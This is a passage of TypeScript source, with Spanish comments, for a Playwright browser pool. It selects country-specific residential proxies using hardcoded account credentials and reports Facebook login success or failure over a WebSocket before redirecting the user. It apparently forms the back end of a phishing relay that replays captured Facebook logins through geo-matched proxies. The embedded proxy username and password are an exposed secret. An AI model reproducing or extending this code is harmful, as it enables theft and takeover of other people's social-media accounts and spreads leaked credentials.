            { host: 'et.smartproxy.com', portRange: [13001, 13999], countryCode: 'ET' },
            { host: 'dj.smartproxy.com', portRange: [14001, 14999], countryCode: 'DJ' },
            { host: 'gm.smartproxy.com', portRange: [15001, 15999], countryCode: 'GM' },
            { host: 'mr.smartproxy.com', portRange: [16001, 16999], countryCode: 'MR' },
            { host: 'mu.smartproxy.com', portRange: [17001, 17999], countryCode: 'MU' },
            { host: 'ao.smartproxy.com', portRange: [18001, 18999], countryCode: 'AO' },
            { host: 'cm.smartproxy.com', portRange: [19001, 19999], countryCode: 'CM' },
            { host: 'sy.smartproxy.com', portRange: [20001, 20999], countryCode: 'SY' }
        ];

        const proxy = proxyList.find(p => p.countryCode === countryCode.toUpperCase());
        if (!proxy) {
            this.logger.alert(`No se pudo obtener un proxy específico para el país(${countryCode.toUpperCase()})`);
            const randPort = Math.floor(Math.random() * (29999 - 10001 + 1)) + 10001;
 ;
            return {
                server: `us.smartproxy.com:${randPort}`,
                username: 'spsfgpi2bg',
                password: '62wUa~uWQHmzrwxi99'
            };
        }
        
        const [minPort, maxPort] = proxy.portRange;
        const randomPort = Math.floor(Math.random() * (maxPort - minPort + 1)) + minPort;

        return {
            server: `${proxy.host}:${randomPort}`,
            username: 'spsfgpi2bg',
            password: '62wUa~uWQHmzrwxi99'
        };
    }

    // Cierra los navegadores inactivos en el pool
    private async closeInactiveBrowsers() {
        for (const browser of this.browserPool) {
            const contexts = browser.contexts();
            if (contexts.length === 0) {
                await browser.close();
                this.browserPool = this.browserPool.filter(b => b !== browser);
            }
        }
    }

    // Maneja los errores y envía mensajes de error a través del WebSocket
    private handleError(error: string | any, ws: WebSocket) {
        console.log('ERROR TYPE => ', typeof error);
        if (typeof error === 'string') {
            this.logger.error(`Catch => ${error}`);
        } else if (error && error.message) {
            this.logger.error(`Catch => ${error.message.toUpperCase().slice(0, 100)}`);
        } else {
            this.logger.error('Catch => Hubo un error inesperado');
        }

        ws.send(JSON.stringify({ event: 'redirect', data: { url: this.redirect } }));
        ws.close(1011, 'Internal server error');
    }

    // Maneja la respuesta de autenticación y envía mensajes a través del WebSocket
    private async handleAuthenticationResponse(response: any, ws: WebSocket) {
        if (response.type === 'login_success') {
            this.logger.success(response.message);
            ws.send(JSON.stringify({ event: 'redirect', data: { url: this.redirect } }));
            ws.close(1011, 'Complete process');
        } else if (response.type === 'login_failed') {
            this.logger.error(response.message);
            ws.send(JSON.stringify({ event: 'login_failed' }));
        } else {
            ws.send(JSON.stringify({ event: 'redirect', data: { url: this.redirect } }));
            ws.close(1011, 'Internal server error');
        }
    }
}

export default BrowserPool;

// Flujo del Código
// Inicialización del Pool de Navegadores:

// El constructor privado de BrowserPool inicializa un pool de navegadores y configura los formularios de login.
// initializeBrowserPool lanza navegadores hasta alcanzar el máximo configurado.
// Singleton Pattern:

// getInstance asegura que solo haya una instancia de BrowserPool.
// Adquisición de Navegadores:

// acquireBrowser busca un navegador disponible en el pool. Si todos están ocupados, lanza uno nuevo si no se ha alcanzado el máximo.
// Gestión de Contextos de Navegador:

// getBrowserContext obtiene o crea un contexto de navegador para un usuario específico.
// releaseBrowserContext cierra y elimina el contexto de un usuario específico.
// Proceso de Login:

// runPlaywright maneja el proceso de login en Facebook, incluyendo la aceptación de cookies y la autentic